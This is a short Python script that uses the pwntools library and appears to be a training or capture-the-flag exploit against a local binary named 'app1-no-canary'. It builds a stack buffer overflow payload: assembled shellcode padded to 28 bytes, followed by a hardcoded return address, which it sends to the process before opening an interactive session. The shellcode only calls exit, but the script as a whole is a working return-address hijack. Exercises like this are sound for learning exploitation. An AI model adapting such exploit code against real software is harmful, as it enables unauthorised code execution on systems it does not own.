from pwn import * 

io = process(["./app1-no-canary"])
pl = asm("""
    mov eax, 1
    int 0x80
""").ljust(28, b'\0')
pl += bytes.fromhex("55683968")[::-1]
io.sendline(pl)
io.interactive()